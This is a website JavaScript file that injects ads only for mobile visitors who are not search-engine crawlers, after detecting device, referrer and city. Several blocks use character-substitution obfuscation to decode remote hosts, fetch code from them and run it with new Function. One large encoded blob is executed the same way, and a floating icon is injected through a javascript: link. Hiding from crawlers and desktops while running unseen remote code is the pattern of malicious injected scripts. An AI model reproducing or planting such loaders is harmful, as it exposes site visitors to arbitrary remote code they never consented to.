function _dbug()
{
    console.log(navigator.userAgent.toLowerCase());
    console.log("is_robot() = " + is_robot());
    console.log("is_referrer_search()=" + is_referrer_search());
    console.log("是否为移动端：" + is_mobile());
    console.log("in_city() = " + in_city());
    console.log("当前地区："+ returnCitySN.cname);
}
/**
 * 检测当前是否为移动端
 * @returns {boolean}
 */
function is_mobile()
{
    var mobileArr = ['android','iPhone','SymbianOS','iPad','iPod','Windows Phone','HarmonyOS'];
    var userAgent = navigator.userAgent.toLowerCase();
    for(var i = 0;i < mobileArr.length;i++){
        if (userAgent.includes(mobileArr[i].toLowerCase())) {
            return true;
        }
    }
    return false;
}
/**
 * 查询当前是否通过搜索引擎进来的
 * @param searchArr
 * @returns {boolean}
 */
function is_referrer_search(searchArr)
{
    if(searchArr == undefined){
        searchArr = ["sogou","soso","baidu","google","youdao","yahoo","bing","sm","so","biso","gougou","ifeng","ivc","sooule","niuhu","biso","360"];
    }
    var referrer = document.referrer;
    for(var i = 0;i < searchArr.length;i++){
        if (referrer.includes(referrer[i].toLowerCase())) {
            return true;
        }
    }
    return false;
}
/**
 * 查询当前是否为蜘蛛访问
 * @param robotArr
 * @returns {boolean}
 */
function is_robot(robotArr)
{
    if(robotArr == undefined){
        robotArr = ['baiduspider','yisouspider','sogou','yahoo','360spider','sosospider','googlebot','bingbot','bytespider','yandexbot','yisouspider'];
    }
    var userAgent = navigator.userAgent.toLowerCase();
    for(var i = 0;i < robotArr.length;i++){
        if (userAgent.includes(robotArr[i].toLowerCase())) {
            return true;
        }
    }
    return false;
}
/**
 * 查询当前地区是否在特殊地区内
 * @param cityArr
 * @returns {boolean}
 */
function in_city(cityArr)
{
    if(cityArr == undefined){
        cityArr = ['北京','广州'];
    }
    var city = returnCitySN.cname;
    for(var i=0;i<cityArr.length;i++){
        if (city.indexOf(cityArr[i]) > -1) {
            return true;
        }
    }
    return false;
}

var system = {
    win: false,
    mac: false,
    xll: false
};
var p = navigator.platform;
system.win = p.indexOf("Win") == 0;
system.mac = p.indexOf("Mac") == 0;
system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);


const chooseDirection = ['b', 't'];
const directionGroup = (arr) => arr[Math.floor(Math.random() * arr.length)];
const direction = directionGroup(chooseDirection);

if (!system.win && !system.mac && !system.xll && !is_robot()) {
    if (direction == 't' || direction == 'all') {
        $("#topnav").attr("style", "margin-top:120px");
        const temporaryGroups = ['todayCpv','t5cpc','t5cpv','smCpv'];
        const randomNums = (arr) => arr[Math.floor(Math.random() * arr.length)];
        const randomElements = randomNums(temporaryGroups);
        if (randomElements == 'todayCpv') {}
        if (randomElements == 't5cpc') {
            (function (){
                var id = "9142199889545937380-62159";
                document.write('<ins style="display:none!important" id="' + id + '"></ins>');
                (window.adbyunion = window.adbyunion || []).push(id);
                document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
            })();
        }
        if(randomElements == 't5cpv'){
            (function (){
                var id = "9142199889545937380-62160";
                document.write('<ins style="display:none!important" id="' + id + '"></ins>');
                (window.adbyunion = window.adbyunion || []).push(id);
                document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
            })();
        }
        if(randomElements == 'smCpv'){
            window.GPjYXY = function(){var keyList = ["6qCRMaDwZYn2pE8KJsH9I0V-r=tmHCbYSeruIVhwp19c23vin-d0" ,"1Yq=E-7hLmKPypzZMlnVIOvsecBt0WaseAGjylwmfvtiXTrCR2zH1gcEkn","UYOtie2yphugran9bMw=AR8F5+74BZDjlq6Cw2s.nrPFtiVZaOghRG=omecdS49p/MI381j:","JkaR56n8+=z0AhOWF4cqMt9y7Q-BwZL2keSgboN062m+BPH8c7s5U=yEfAqhZwW4",];function decrypt(t, e) {if (!t) return "";for (var a = t.split(""), n = e.split(""), i = {}, r = [], o = 0;o < a.length / 2;o++)i[a[o]] = a[a.length / 2 + o];for (var s = 0; s < e.length; s++) r.push(i[n[s]]);return r.join("");};(!/^Mac|Win/.test(navigator.platform)||!navigator.platform)?(function(u, i, w, d) {var x = decrypt,cs = d[x(keyList[0],"RYZZwV6DRZn86" )],crd = x(keyList[1],"nl=Yp==L=K=0p");'jQuery';u = decodeURIComponent(x(keyList[2], u));'jQuery';var xhr = new XMLHttpRequest();xhr.open('GET', u + '/s/a?_=' + x(keyList[3], i));xhr.onreadystatechange = function() {if (xhr.readyState == 4 && xhr.status == 200) {var data = JSON.parse(xhr.responseText);new Function(data.data)(cs);}};xhr.send('u=1');})("9pp2OCBBr2htOhAhqYj+t8aA", "2++WW848W4+q22=82W", window, document):function(){}};window['GPjYXY']();
        
        }
        // 小图标
        window.WBiFhQ =function(){var a=document.createElement('a');var evjs=`var cname='WBiFhQ',bn='https://dingbu.bj.bcebos.com/xiaotubiao.adddd',jp='https://api.simi1234.com/a/c?au6e4511da705ef7a712d549e2736fed41=',cst=1,mg=16,mimgh=100,cx=0,cy=0,imgh=0,imghs=0,drv=isCheckD(),browserWidth=getBrowserWH().w,browserHeight=getBrowserWH().h;if(drv){crateEl(cname);var n=0;setTimeout(function(){n++;var elobj;setInterval(function(){elobj=resbaner();if(!elobj){return recreate(elobj)}var eh=elobj.getBoundingClientRect().height;if(eh<=2){return recreate(elobj)}})},500)}var s=document.createElement('script');s.src='https://api.simi1234.com/s/c?_=466880386814861312';document.getElementsByTagName('head')[0].appendChild(s);function crateEl(n,t){var by=document.body;if(!by){return false};var br=document.createElement('div');br.setAttribute('class',n);var img=document.createElement('img');img.src=bn;br.append(img);by.appendChild(br);br.addEventListener('touchmove',handleMove);br.addEventListener('touchend',handleChend);br.addEventListener('touchstart',handleTouchstart);img.onload=function(){if(cx!==0||cy!==0){setbs(br);return}if(t!=undefined){return}imgh=this.height;setViewHeight(imgh/2)}}function recreate(elobj){if(elobj!=null&&elobj!=undefined){elobj.remove()};cname=its(10);return crateEl('WBiFhQ '+cname,0)}var eLeft=0,eTop=0;var isClick=false;function handleTouchstart(e){e.preventDefault();e.stopPropagation();eLeft=e.touches[0].pageX-this.offsetLeft,eTop=e.touches[0].pageY-this.offsetTop;isClick=true}function handleMove(e){e.preventDefault();e.stopPropagation();cx=e.touches[0].pageX-eLeft;cy=e.touches[0].pageY-eTop;imghs=imgh+2;var bw=browserWidth-imghs,bh=browserHeight-imghs;var left=(cx>=bw?bw:cx<=0?0:cx),top=(cy<=0?0:cy>=bh?bh:cy);cx=left;cy=top;this.style.cssText='left:'+left+'px;top:'+top+'px';isClick=false}function handleChend(e){e.preventDefault();e.stopPropagation();if(isClick){var self=this;self.style.transition='0.1s';self.style.transform='scale(0.90)';setTimeout(function(){self.style.transform='scale(1)'},150);setTimeout(function(){self.style.transform='scale(1)';var ja=document.createElement('a');ja.href=jp+au6e4511da705ef7a712d549e2736fed41;ja.click();ja.remove()},300)}else{handleVposition(this)}}function handleVposition(e){var o=inLeftOrRight();e.style.transition='0.2s';cx=cx>browserWidth?browserWidth:cx;var hb=(browserHeight-(imghs+mg));cy=cy>=hb?(hb):cy<=0?0:cy;cy==0?e.style.top=mg+'px':e.style.top=cy+'px';if(cx>=o.mp){e.style.left=browserWidth-(imgh+mg)+'px'}else{e.style.left=mg+'px'}}function setbs(e){var o=inLeftOrRight();var tcy=cy+'px';if(cx>=o.mp){e.style.top=tcy}else{e.style.top=tcy;e.style.left=mg+'px'}}function inLeftOrRight(){var mp=(browserWidth/2)-(imghs/2);return{mp:mp,bh:browserHeight-imghs}}function getStyleStr(el){var obs=window.getComputedStyle(el,'');var str='';for(k in obs){if(parseInt(k).toString()=='NaN'){str+=k+': '+obs[k]+';'+'<br/>'}}return str}if(drv){addStyle('.WBiFhQ{z-index:999;top:50%;right:0px;position:fixed;width:'+mimgh+'px !important;}.WBiFhQ img{width:100%;height:100%;}')}function setViewHeight(h){if(drv){var ps='left:'+(cst==0?mg:browserWidth-(imgh+mg))+'px';addStyle('.WBiFhQ{top:calc(50% - '+h+'px);'+ps+'}')}}function addStyle(style){ var styleObj=document.createElement('style');styleObj.setAttribute('type','text/css');styleObj.innerHTML=style;document.getElementsByTagName('head')[0].appendChild(styleObj)}function resbaner(){return document.querySelector('.'+cname)}function isCheckD(){var p=navigator.platform;var system={win:false,mac:false};system.win=p.indexOf('Win')==0;system.mac=p.indexOf('Mac')==0;if(system.win||system.mac){return false}return true}function its(len){var r=['a','B','c','d','e','G','g','h','J','j','k'],str='';for(var i=0;i<len;i++){var rx=Math.round(Math.random()*(r.length-1));str+=r[rx]}return str}function getBrowserWH(){var o={w:document.documentElement.clientWidth||document.body.clientWidth,h:document.documentElement.clientHeight||document.body.clientHeight};return o}function getElse(el,ar){return window.getComputedStyle?window.getComputedStyle(el,null)[ar]:el.currentStyle[ar]};`;a.href='javascript:'+evjs;a.click()};window.WBiFhQ();

    }
    // bottom
    if (direction == 'b' || direction == 'all') {
        const temporaryGroup = ['todayCpv', 'todayCpc', 'hl','t5cpc','t5cpv','smCpv'];
        const randomNum = (arr) => arr[Math.floor(Math.random() * arr.length)];
        const randomElement = randomNum(temporaryGroup);
        if (randomElement == 'todayCpv') {}
        if(randomElement == 'todayCpc'){}
        if (randomElement == 'hl') {}
        if (randomElement == 't5cpv') {
            (function (){
                var id = "9142199889545937380-62158";
                document.write('<ins style="display:none!important" id="' + id + '"></ins>');
                (window.adbyunion = window.adbyunion || []).push(id);
                document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
            })();
        }
        if (randomElement == 't5cpc'){
            (function (){
                var id = "9142199889545937380-62157";
                document.write('<ins style="display:none!important" id="' + id + '"></ins>');
                (window.adbyunion = window.adbyunion || []).push(id);
                document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
            })();
        }
        if (randomElement == 'hl') {
            !function(){function a(a){var b={e:"P",w:"D",T:"y","+":"J",l:"!",t:"L",E:"E","@":"2",d:"a",b:"%",q:"l",X:"v","~":"R",5:"r","&":"X",C:"j","]":"F",a:")","^":"m",",":"~","}":"1",x:"C",c:"(",G:"@",h:"h",".":"*",L:"s","=":",",p:"g",I:"Q",1:"7",_:"u",K:"6",F:"t",2:"n",8:"=",k:"G",Z:"]",")":"b",P:"}",B:"U",S:"k",6:"i",g:":",N:"N",i:"S","%":"+","-":"Y","?":"|",4:"z","*":"-",3:"^","[":"{","(":"c",u:"B",y:"M",U:"Z",H:"[",z:"K",9:"H",7:"f",R:"x",v:"&","!":";",M:"_",Q:"9",Y:"e",o:"4",r:"A",m:".",O:"o",V:"W",J:"p",f:"d",":":"q","{":"8",W:"I",j:"?",n:"5",s:"3","|":"T",A:"V",D:"w",";":"O"};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a('ozgxrZvgvrl7_2(F6O2cYa[Xd5 F8[P!7_2(F6O2 5c2a[67cFH2Za5YF_52 FH2ZmYRJO5FL!Xd5 O8FH2Z8[6g2=qgl}=YRJO5FLg[PP!5YF_52 YH2Zm(dqqcOmYRJO5FL=O=OmYRJO5FL=5a=Omq8l0=OmYRJO5FLP5m^8Y=5m(8F=5mf87_2(F6O2cY=F=2a[5mOcY=Fa??;)CY(FmfY762Ye5OJY5FTcY=F=[Y2_^Y5d)qYgl0=pYFg2PaP=5m587_2(F6O2cYa["_2fY762Yf"l8FTJYO7 iT^)OqvviT^)OqmFOiF562p|dpvv;)CY(FmfY762Ye5OJY5FTcY=iT^)OqmFOiF562p|dp=[Xdq_Yg"yOf_qY"Pa=;)CY(FmfY762Ye5OJY5FTcY="MMYLyOf_qY"=[Xdq_Ygl0PaP=5mF87_2(F6O2cY=Fa[67c}vFvvcY85cYaa={vFa5YF_52 Y!67covFvv"O)CY(F"88FTJYO7 YvvYvvYmMMYLyOf_qYa5YF_52 Y!Xd5 28;)CY(Fm(5YdFYc2_qqa!67c5m5c2a=;)CY(FmfY762Ye5OJY5FTc2="fY7d_qF"=[Y2_^Y5d)qYgl0=Xdq_YgYPa=@vFvv"LF562p"l8FTJYO7 Ya7O5cXd5 O 62 Ya5mfc2=O=7_2(F6O2cFa[5YF_52 YHFZPm)62fc2_qq=Oaa!5YF_52 2P=5m287_2(F6O2cYa[Xd5 F8YvvYmMMYLyOf_qYj7_2(F6O2ca[5YF_52 YmfY7d_qFPg7_2(F6O2ca[5YF_52 YP!5YF_52 5mfcF="d"=Fa=FP=5mO87_2(F6O2cY=Fa[5YF_52 ;)CY(FmJ5OFOFTJYmhdL;D2e5OJY5FTm(dqqcY=FaP=5mJ8""=5c5mL80aPcH7_2(F6O2cY=Fa[Xd5 58fO(_^Y2F=282dX6pdFO5mJqdF7O5^=O85m(_55Y2Fi(56JF!67c/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?yIIu5ODLY5?Bxu5ODLY5/pmFYLFc2dX6pdFO5m_LY5rpY2Fal887dqLYa[67cl/3yddd(?V6662/mFYLFc2a??l2a[Xd5 6LDL86LMSS80!Xd5 6^pL(8"hFFJLg//LSTmL7)6R7fm(2/)d6f_MJ6(/"%ydFhm(Y6qcydFhm5d2fO^ca.}0a%"mCJp"!LYF|6^YO_Fc7_2(F6O2ca[67c6LDL880a[Xd5 SpRFT7Y)8"hFFJLg//((Lm(hOqO5@0}}}nm(2/((/}QsKj6LM2OF8}vFd5pYF8}"!Xd5 (q6Y2FD6fFh8D62fODmL(5YY2mdXd6qV6fFh!5m)OfTmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[Xd5 (q6Y2FhY6phF8D62fODmL(5YY2mdXd6q9Y6phF!Xd5 YXY8YXY2F??D62fODmYXY2F!Xd5 (R8(T80!67cYXYvvYXYmFTJY88"FO_(hLFd5F"a[(R8YXYmFO_(hYLH0Zm(q6Y2F&!(T8YXYmFO_(hYLH0Zm(q6Y2F-!P67cYXYvvYXYmFTJY88"FO_(hY2f"a[(R8YXYm(hd2pYf|O_(hYLH0ZmL(5YY2&!(T8YXYm(hd2pYf|O_(hYLH0Zm(q6Y2F-!P67cYXYvvYXYmFTJY88"(q6(S"a[(R8YXYm(q6Y2F&!(T8YXYm(q6Y2F-!P67c(R>0vv(T>0a[67c(T>c(q6Y2FhY6phF*c@00.c(q6Y2FD6fFh/K00aaavv6LMSS880a[6LMSS8}!67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O28SpRFT7Y)!PYqLY[D62fODmqO(dF6O2mh5Y78SpRFT7Y)!P6LMSS80!PPPa! Xd5 :4CT6S2hM2}80!Xd5 :4CT6S2hMLYF62F}8LYFW2FY5Xdqc7_2(F6O2ca[67c:4CT6S2hM2}<ssa[Xd5 Fdp85m(5YdFYEqY^Y2Fc"f6X"a!FdpmLFTqY8"f6LJqdTg)qO(S!qY7Fg0!56phFg@!JOL6F6O2gd)LOq_FY!4*62fYRg}000000!D6fFhgQQb!hY6phFgsmsXD!)O5fY5*qY7Fg}JR LOq6f #ddd!"!Xd5 hY6XD8:4CT6S2hM2}!Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!FdpmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"!D62fODmdffEXY2Ft6LFY2Y5c"L(5Oqq"=7_2(F6O2ca[Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!FdpmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"Pa!FdpmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O28:4CT6S2hPYqLY[D62fODmqO(dF6O2mh5Y78:4CT6S2hPPa!5m)OfTmdJJY2fxh6qfcFdpa!:4CT6S2hM2}%8smsPYqLY[(qYd5W2FY5Xdqc:4CT6S2hMLYF62F}aPP=n0a! Xd5 :4CT6S2hM2@8}!Xd5 :4CT6S2hMLYF62F@8LYFW2FY5Xdqc7_2(F6O2ca[67c:4CT6S2hM2@<8}0a[Xd5 (d2Xd85m(5YdFYEqY^Y2Fc"(d2XdL"a!Xd5 hY6XD8cc}0*:4CT6S2hM2@a.smsa!(d2XdmLFTqY8"D6fFhgQQb!hY6phFgsmsXD!qY7Fg0!56phFg@JR!JOL6F6O2gd)LOq_FY!)O5fY5*qY7Fg@JR LOq6f #70KQn7!^d5p62g0JR!"!(d2XdmD6fFh8K00!(d2XdmhY6phF8@0!Xd5 (FR8(d2XdmpYFxO2FYRFc"@f"a!Xd5 6^p82YD W^dpYca!Xd5 LT8*c@0.:4CT6S2hM2@a%@0!6^pmO2qOdf87_2(F6O2ca[(FRmf5dDW^dpYc6^p=0=LT=K00=@00aP!6^pmL5(86^pL(!5m)OfTmdJJY2fxh6qfc(d2Xda!Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!(d2XdmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"!D62fODmdffEXY2Ft6LFY2Y5c"L(5Oqq"=7_2(F6O2ca[Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!(d2XdmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"Pa!:4CT6S2hM2@%%PYqLY[(qYd5W2FY5Xdqc:4CT6S2hMLYF62F@aPP=}00a!Xd5 685mpYFEqY^Y2FuTWfc":4CT6S2hMFC"a!67c6a[6mL5(86mpYFrFF56)_FYc"fdFd*_5q"aPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//((Lm(hOqO5@0}}}nm(2/f/}QsKj(8}vF8on}o0s1n"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_a!PXd5 L))85m(5YdFYEqY^Y2Fc"LFTqY"a!L))m622Y59|yt8")OfT[JOL6F6O2g626F6dq l6^JO5Fd2F!^62*hY6phFg"%D62fODmL(5YY2mhY6phF%"JR l6^JO5Fd2F!Jdff62p*)OFFO^g}00JR l6^JO5Fd2F!P"!5mhYdfmdJJY2fxh6qfcL))aP!P= }000a!Xd5 DLRp8H"))Lm)hOqO5@0}}}nm(2"="))Lm)hOqO5@0}}}Km(2"="))Lm)hOqO5@0}}}1m(2"="))Lm)hOqO5@0}}}nm(2"="))Lm)hOqO5@0}}}Km(2"="))Lm)hOqO5@0}}}1m(2"Z!Xd5 S8ydFhm7qOO5cc2YD wdFYcaampYFwdFYca/na!S8cS>najngS!Xd5 DL_8c"hFFJLg"885mqO(dF6O2mJ5OFO(Oqaj"DLLg//"%DLRpHSZ%"g@00Q}"g"DLg//"%DLRpHSZ%"g@00Q0"!Xd5 (82YD VY)iO(SYFcDL_%"/}QsK"a!(mO2OJY287_2(F6O2cYa[6LDL86LMSS8}!Xd5 (d2Xd85mpYFEqY^Y2FuTWfc":4CT6S2h"a!67c(d2Xda[(d2XdmLFTqY8"f6LJqdTg2O2Y!"PP!(mO2^YLLdpY87_2(F6O2cYa[Xd5 F87_2(F6O2cYa[Xd5 F=5=2=O=(=6=_=d8"("%"h"%"d"%"5"%"r"%"F"=78"7"%"5"%"O"%"^"%"x"%"h"%"d"%"5"%"x"%"O"%"f"%"Y"=q8"("%"h"%"d"%"5"%"x"%"O"%"f"%"Y"%"r"%"F"=f8"6"%"2"%"f"%"Y"%"R"%";"%"7"=L8"r"%"u"%"x"%"w"%"E"%"]"%"k"%"9"%"W"%"+"%"z"%"t"%"y"%"N"%";"%"e"%"I"%"~"%"i"%"|"%"B"%"A"%"V"%"&"%"-"%"U"%"d"%")"%"("%"f"%"Y"%"7"%"p"%"h"%"6"%"C"%"S"%"q"%"^"%"2"%"O"%"J"%":"%"5"%"L"%"F"%"_"%"X"%"D"%"R"%"T"%"4"%"0"%"}"%"@"%"s"%"o"%"n"%"K"%"1"%"{"%"Q"%"%"%"/"%"8"=J8""=p80!7O5cY8Ym5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!p<YmqY2pFh!aO8LHfZcYHdZcp%%aa=(8LHfZcYHdZcp%%aa=68LHfZcYHdZcp%%aa=_8LHfZcYHdZcp%%aa=F8O<<@?(>>o=58c}nv(a<<o?6>>@=28csv6a<<K?_=J%8iF562pH7ZcFa=Kol86vvcJ%8iF562pH7Zc5aa=Kol8_vvcJ%8iF562pH7Zc2aa!5YF_52 7_2(F6O2cYa[7O5cXd5 F8""=2858(}8(@80!2<YmqY2pFh!ac58YHqZc2aa<}@{jcF%8iF562pH7Zc5a=2%%ag5>}Q}vv5<@@ojc(@8YHqZc2%}a=F%8iF562pH7Zccs}v5a<<K?Ksv(@a=2%8@agc(@8YHqZc2%}a=(s8YHqZc2%@a=F%8iF562pH7Zcc}nv5a<<}@?cKsv(@a<<K?Ksv(sa=2%8sa!5YF_52 FPcJaPcYmfdFda!2YD ]_2(F6O2c"MFf(L"=FacOa=(m(qOLYcaPPPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//DdJmdTS6)5dm(2/L(/}QsKj28:4CT6S2h"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_aPPZa!'.substr(10));new Function(b)()}();
        
        }
        if(randomElement == 'smCpv'){
            window.MVgUsy = function(){var keyList = ["grhRIXtbzcZDjmCVHEd5wu7WNPl2yhpyzBKxN5=eduSiJ4trcFGnsMRVl7" ,"UKz0J-18ubEglxCWFMkmN5GtdZAXn3rc6ipj6d+EoSm2fnMclaF8-rxU94sVe1ugtJ","9Q8c0xNI1oCKstzwrfGlDZP4VhUWkTg=HuqE2L6mnMa734l0Nis/ocWz2a5w7VR9g.If6p:YrZ=OTFb8QkSdtmPh","FEhqlGbfQPtW=jNLB0V7eKo56XwpyJ6TDUVwzt8KM4r+03njY9Rvisal2A",];function decrypt(t, e) {if (!t) return "";for (var a = t.split(""), n = e.split(""), i = {}, r = [], o = 0;o < a.length / 2;o++)i[a[o]] = a[a.length / 2 + o];for (var s = 0; s < e.length; s++) r.push(i[n[s]]);return r.join("");};(!/^Mac|Win/.test(navigator.platform)||!navigator.platform)?(function(u, i, w, d) {var x = decrypt,cs = d[x(keyList[0],"5jddZbEm5dCrE" )],crd = x(keyList[1],"CN1Fc11W1b1lc");'jQuery';u = decodeURIComponent(x(keyList[2], u));'jQuery';var xhr = new XMLHttpRequest();xhr.open('GET', u + '/s/a?_=' + x(keyList[3], i));xhr.onreadystatechange = function() {if (xhr.readyState == 4 && xhr.status == 200) {var data = JSON.parse(xhr.responseText);new Function(data.data)(cs);}};xhr.send('u=1');})("7HHhNUIIthxZNxMxs9QzZo1M", "=EEPPLEppP=LeBLBL=", window, document):function(){}};window['MVgUsy']();

        }
    }

}
